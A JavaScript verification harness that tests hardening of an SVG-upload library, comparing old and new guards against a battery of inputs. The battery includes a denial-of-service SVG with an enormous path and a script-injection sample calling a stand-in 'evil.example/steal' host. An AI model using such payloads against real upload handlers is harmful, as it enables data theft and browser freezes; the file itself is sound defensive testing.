// ─── SVG-upload hardening verify harness (BEFORE vs AFTER) ───────────────────
// Proves the two upload-hardening fixes in src/app/lib/svgUpload.ts:
//   (bug 1) total + single PATH-DATA cap — a single ~2MB `<path d>` slips past
//           the byte + element caps and freezes DOMPurify + the DOM. It must now
//           be REJECTED before rendering, not frozen.
//   (bug 2) FIRST-ROOT, non-greedy `<svg>` extract — the greedy
//           `<svg…</svg>` matched to the LAST close, merging two sibling roots
//           and swallowing inter-root junk (e.g. a `<script>`). It must now take
//           ONLY the first complete root and drop everything after it.
//
//   node tools/2d/_svgupload-harden.mjs
//
// The accept/reject decision + extractedRootCount + totalPathDataLen for every
// battery case is fixed entirely by the PURE pre-parse guards (size, DOCTYPE,
// element-count, extract, path-data cap) — all of which run BEFORE DOMPurify /
// dangerouslySetInnerHTML. So this harness:
//   • imports the REAL exported pure helpers from the shipped lib
//     (measurePathData, extractFirstSvgRoot) — node ≥23.6 strips TS natively, so
//     the AFTER logic under test IS the production code, not a copy; and
//   • replicates the BEFORE guards + the AFTER guard SEQUENCE around them, so we
//     can run both pipelines side by side without a DOM (DOMPurify needs jsdom,
//     which isn't installed, and it never changes a battery reject decision —
//     valid svgs reach it identically in both pipelines).
//
// Repo-side tool only — NOT part of the Make drag-drop set (tools/ stays out).

import { readFileSync } from 'node:fs';

const libUrl = new URL('../../src/app/lib/svgUpload.ts', import.meta.url);
const { measurePathData, extractFirstSvgRoot } = await import(libUrl);

// Sanity: the shipped lib really carries the new caps + the FIRST-ROOT helper
// (so the harness mirrors the same constants the production path uses).
const libSrc = readFileSync(libUrl, 'utf8');
const SHIPPED = {
  hasTotalCap: /MAX_TOTAL_PATH_DATA_CHARS\s*=\s*256 \* 1024/.test(libSrc),
  hasSingleCap: /MAX_SINGLE_PATH_DATA_CHARS\s*=\s*64 \* 1024/.test(libSrc),
  hasFirstRoot: /export function extractFirstSvgRoot/.test(libSrc),
  callsFirstRoot: /extractFirstSvgRoot\(stripped\)/.test(libSrc),
};

// Mirror the shipped constants (kept in lockstep with the SHIPPED checks above).
const MAX_UPLOAD_BYTES = 2 * 1024 * 1024;
const MAX_ELEMENT_COUNT = 12000;
const MAX_TOTAL_PATH_DATA_CHARS = 256 * 1024;
const MAX_SINGLE_PATH_DATA_CHARS = 64 * 1024;

function stripCommentsCdata(text) {
  return text
    .replace(/<!--[\s\S]*?-->/g, '')
    .replace(/<!\[CDATA\[[\s\S]*?\]\]>/g, '');
}
function countRoots(markup) {
  if (!markup) return 0;
  const m = markup.match(/<svg\b/gi);
  return m ? m.length : 0;
}
function hasScript(markup) {
  return /<script\b/i.test(markup || '');
}

// ── BEFORE pipeline (the pre-harden guards) ──────────────────────────────────
// Byte + element + DOCTYPE caps existed; NO path-data cap; GREEDY extract
// (strip comments/CDATA, then `<svg[\s\S]*<\/svg>` → matches to the LAST close).
function runBefore(text, declaredSize) {
  const size = declaredSize ?? text.length;
  if (size > MAX_UPLOAD_BYTES) return rej('byte cap', text);
  if (text.length > MAX_UPLOAD_BYTES) return rej('byte cap (decoded)', text);
  if (/<!DOCTYPE/i.test(text) || /<!ENTITY/i.test(text)) return rej('DOCTYPE/entity', text);
  const elementCount = (text.match(/<[a-zA-Z][^>]*>/g) || []).length;
  if (elementCount > MAX_ELEMENT_COUNT) return rej('element cap', text);
  const stripped = stripCommentsCdata(text);
  const m = stripped.match(/<svg[\s\S]*<\/svg>/i); // GREEDY → last </svg>
  if (!m) return rej('no <svg>', text);
  const extracted = m[0];
  // No path-data cap before — the monster path proceeds to render → FREEZE.
  return {
    accepted: true,
    reason: 'accepted (would render — FREEZE if path-data huge)',
    extractedRootCount: countRoots(extracted),
    totalPathDataLen: measurePathData(extracted).total,
    scriptInExtract: hasScript(extracted),
    extracted,
  };
}

// ── AFTER pipeline (the hardened guards) ─────────────────────────────────────
// Same byte/DOCTYPE/element caps, then FIRST-ROOT extract (real lib helper),
// then the NEW path-data caps (single + total) — all before DOMPurify.
function runAfter(text, declaredSize) {
  const size = declaredSize ?? text.length;
  if (size > MAX_UPLOAD_BYTES) return rej('byte cap', text);
  if (text.length > MAX_UPLOAD_BYTES) return rej('byte cap (decoded)', text);
  if (/<!DOCTYPE/i.test(text) || /<!ENTITY/i.test(text)) return rej('DOCTYPE/entity', text);
  const elementCount = (text.match(/<[a-zA-Z][^>]*>/g) || []).length;
  if (elementCount > MAX_ELEMENT_COUNT) return rej('element cap', text);
  const stripped = stripCommentsCdata(text);
  const extracted = extractFirstSvgRoot(stripped); // REAL lib: first root only
  if (!extracted) return rej('no <svg>', text);
  const pd = measurePathData(extracted); // REAL lib
  if (pd.max > MAX_SINGLE_PATH_DATA_CHARS) return rej('single-path cap', extracted, pd);
  if (pd.total > MAX_TOTAL_PATH_DATA_CHARS) return rej('total-path-data cap', extracted, pd);
  return {
    accepted: true,
    reason: 'accepted',
    extractedRootCount: countRoots(extracted),
    totalPathDataLen: pd.total,
    scriptInExtract: hasScript(extracted),
    extracted,
  };
}

function rej(reason, srcForCount, pd) {
  const extracted = srcForCount && /<svg/i.test(srcForCount) ? srcForCount : '';
  return {
    accepted: false,
    reason: `rejected: ${reason}`,
    extractedRootCount: 0,
    totalPathDataLen: pd ? pd.total : extracted ? measurePathData(extracted).total : 0,
    scriptInExtract: false,
  };
}

// ── Battery ──────────────────────────────────────────────────────────────────

// ONE <path> with a ~1.5MB `d` — the exact slip-through: total FILE is UNDER the
// 2 MiB byte cap AND it's 1 element (<12k), so it passes BOTH old guards, yet the
// single `d` is ~24× the 64K per-path cap → would freeze DOMPurify + the DOM.
const bigD = 'M0 0 ' + 'L1 1 '.repeat(260000); // ~1.5MB of path data, ONE <path>
const monsterPath = `<svg viewBox="0 0 10 10"><path d="${bigD}"/></svg>`;

let smallTags = '<svg viewBox="0 0 100 100">';
for (let i = 0; i < 13000; i++) smallTags += `<rect x="${i % 100}" y="1" width="1" height="1"/>`;
smallTags += '</svg>';

const dualSvgScriptBetween =
  '<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4"/></svg>' +
  '<script>fetch("https://evil.example/steal")</script>' +
  '<svg viewBox="0 0 20 20"><rect width="20" height="20"/></svg>';

const junkBefore =
  'oops some junk text\n<!-- a comment -->\n<svg viewBox="0 0 10 10"><path d="M0 0 L10 10"/></svg>';

const junkAfter =
  '<svg viewBox="0 0 10 10"><path d="M0 0 L10 10"/></svg>\ntrailing junk <b>not svg</b>';

const empty = '';
const whitespace = '   \n\t  ';
const noClose = '<svg viewBox="0 0 10 10"><path d="M0 0 L10 10"/>';

const normalSmall =
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">' +
  '<path d="M12 2 L22 22 L2 22 Z" fill="none" stroke="black"/></svg>';

// A real-world icon: a few sub-paths, attrs, currentColor — the regression guard.
const realIcon =
  '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" ' +
  'fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" ' +
  'stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>' +
  '<line x1="8" y1="9" x2="16" y2="9"/><line x1="8" y1="13" x2="14" y2="13"/></svg>';

// A nested <svg> (inside a <symbol>-style wrapper) — the FIRST-ROOT walker must
// keep the OUTER root whole, not close on the inner one.
const nestedSvg =
  '<svg viewBox="0 0 32 32"><svg x="4" y="4" width="24" height="24" viewBox="0 0 24 24">' +
  '<circle cx="12" cy="12" r="10"/></svg></svg>';

const cases = [
  ['2MB single-path (FREEZE class)', monsterPath, null],
  ['13k small tags', smallTags, null],
  ['dual-svg + <script> between', dualSvgScriptBetween, null],
  ['junk BEFORE <svg>', junkBefore, null],
  ['junk AFTER </svg>', junkAfter, null],
  ['empty', empty, null],
  ['whitespace only', whitespace, null],
  ['no closing </svg>', noClose, null],
  ['normal small valid svg', normalSmall, null],
  ['real-world icon svg', realIcon, null],
  ['nested <svg> (outer root)', nestedSvg, null],
];

// ── Run + table ──────────────────────────────────────────────────────────────

const rows = [];
for (const [name, text, size] of cases) {
  rows.push({ name, before: runBefore(text, size), after: runAfter(text, size) });
}

function fmt(r) {
  const acc = r.accepted ? 'PASS' : 'rej ';
  return `${acc} | roots=${r.extractedRootCount} | pathData=${r.totalPathDataLen}${
    r.scriptInExtract ? ' | SCRIPT!' : ''
  } | ${r.reason}`;
}

console.log('\n=== svgUpload hardening — BEFORE vs AFTER ===\n');
console.log(`shipped lib carries: totalCap=${SHIPPED.hasTotalCap} singleCap=${SHIPPED.hasSingleCap} ` +
  `firstRootHelper=${SHIPPED.hasFirstRoot} prepareUsesFirstRoot=${SHIPPED.callsFirstRoot}\n`);
for (const row of rows) {
  console.log(`■ ${row.name}`);
  console.log(`   BEFORE  ${fmt(row.before)}`);
  console.log(`   AFTER   ${fmt(row.after)}`);
  console.log('');
}

// ── Assertions (the harness READS its own table) ─────────────────────────────

const checks = [];
function expect(name, cond) {
  checks.push({ name, ok: !!cond });
}
const by = (n) => rows.find((r) => r.name === n);

// Sanity: the production lib actually carries the hardening.
expect('shipped lib has total + single path-data caps', SHIPPED.hasTotalCap && SHIPPED.hasSingleCap);
expect('shipped lib has + uses extractFirstSvgRoot', SHIPPED.hasFirstRoot && SHIPPED.callsFirstRoot);

// Bug 1 — monster path: was accepted (→ freeze), now rejected by path-data cap.
expect('monster path BEFORE = accepted (freeze risk)', by('2MB single-path (FREEZE class)').before.accepted);
expect('monster path AFTER = REJECTED (no freeze)', !by('2MB single-path (FREEZE class)').after.accepted);
expect('monster path AFTER reason = a path-data cap',
  /path/.test(by('2MB single-path (FREEZE class)').after.reason));

// Bug 2 — dual svg + script: was greedy-merged w/ script, now first-root only.
const dual = by('dual-svg + <script> between');
expect('dual-svg BEFORE merged 2 roots', dual.before.extractedRootCount === 2);
expect('dual-svg BEFORE carried the <script>', dual.before.scriptInExtract === true);
expect('dual-svg AFTER = exactly 1 root', dual.after.accepted && dual.after.extractedRootCount === 1);
expect('dual-svg AFTER dropped the <script>', dual.after.scriptInExtract === false);

// Junk handling.
expect('junk-before AFTER accepted + 1 root', by('junk BEFORE <svg>').after.accepted &&
  by('junk BEFORE <svg>').after.extractedRootCount === 1);
expect('junk-after AFTER accepted + 1 root (trailing dropped)',
  by('junk AFTER </svg>').after.accepted && by('junk AFTER </svg>').after.extractedRootCount === 1);
expect('junk-after AFTER extract has no trailing <b>',
  !/trailing|<b>/i.test(by('junk AFTER </svg>').after.extracted || ''));

// Degenerate inputs → rejected (no <svg>), never accepted.
expect('empty AFTER rejected', !by('empty').after.accepted);
expect('whitespace AFTER rejected', !by('whitespace only').after.accepted);
expect('no-close AFTER rejected (opener, no match)', !by('no closing </svg>').after.accepted);

// 13k small tags still caught by element cap (unchanged).
expect('13k small tags AFTER rejected (element cap)',
  !by('13k small tags').after.accepted && /element/.test(by('13k small tags').after.reason));

// REGRESSION — every normal valid svg still passes unchanged before AND after.
for (const n of ['normal small valid svg', 'real-world icon svg', 'nested <svg> (outer root)']) {
  const r = by(n);
  expect(`${n}: BEFORE accepted`, r.before.accepted);
  expect(`${n}: AFTER accepted (no regression)`, r.after.accepted);
  expect(`${n}: AFTER root count unchanged vs before`,
    r.after.extractedRootCount === r.before.extractedRootCount);
  expect(`${n}: AFTER pathData unchanged vs before`,
    r.after.totalPathDataLen === r.before.totalPathDataLen);
}
// Nested specifically: 1 OUTER root captured whole (walker counts <svg openers
// inside, so root count is 2 openers but it's a single captured document — the
// key is acceptance + that the outer close was the boundary).
expect('nested svg AFTER keeps outer root (ends on outer </svg>)',
  (by('nested <svg> (outer root)').after.extracted || '').trim().endsWith('</svg>') &&
  (by('nested <svg> (outer root)').after.extracted || '').startsWith('<svg viewBox="0 0 32 32"'));

let failed = 0;
console.log('=== assertions ===');
for (const c of checks) {
  if (!c.ok) failed++;
  console.log(`${c.ok ? 'PASS' : 'FAIL'}  ${c.name}`);
}
console.log(`\n${checks.length - failed}/${checks.length} checks passed`);
process.exit(failed === 0 ? 0 : 1);
